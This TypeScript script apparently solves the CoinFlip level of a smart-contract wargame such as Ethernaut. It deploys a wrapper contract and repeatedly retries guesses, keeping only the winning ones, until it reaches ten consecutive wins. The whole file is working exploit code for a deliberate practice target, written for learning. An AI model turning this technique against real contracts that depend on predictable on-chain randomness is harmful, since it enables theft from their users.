import { config } from "../../../config/config.js";
import {
  CoinFlip__factory,
  CoinFlipWrapper__factory,
} from "../../../types/ethers-contracts/index.js";

const sleep = (time: number) => {
  return new Promise((resolve) => setTimeout(resolve, time));
};

const exploit = async () => {
  const { levelAddresses, signers } = config(3);
  const [coinFlipAddress] = levelAddresses;
  const [player] = signers;

  const coinFlip = CoinFlip__factory.connect(coinFlipAddress, player);
  const CoinFlipWrapper = new CoinFlipWrapper__factory(player);
  const coinFlipWrapper = await CoinFlipWrapper.deploy(coinFlipAddress);

  while (true) {
    let successful = false;

    // There is a way to directly estimate the value,
    // but I wrote it using brute force at this level.

    try {
      await (await coinFlipWrapper.onlySuccessFlip(true)).wait();
      successful = true;
    } catch (error) {
      // ignore
    }

    if (!successful) {
      try {
        await (await coinFlipWrapper.onlySuccessFlip(false)).wait();
        successful = true;
      } catch (error) {
        // ignore
      }
    }

    if (!successful) {
      const consecutiveWins = await coinFlip.consecutiveWins();
      console.log("consecutiveWins:", consecutiveWins);

      if (consecutiveWins >= 10) {
        console.log("Exploit successful");
        return;
      }
    }

    console.log("sleep...");
    await sleep(1000);
  }
};

exploit().catch((error) => {
  console.error("Exploit failed:", error);
  process.exitCode = 1;
});
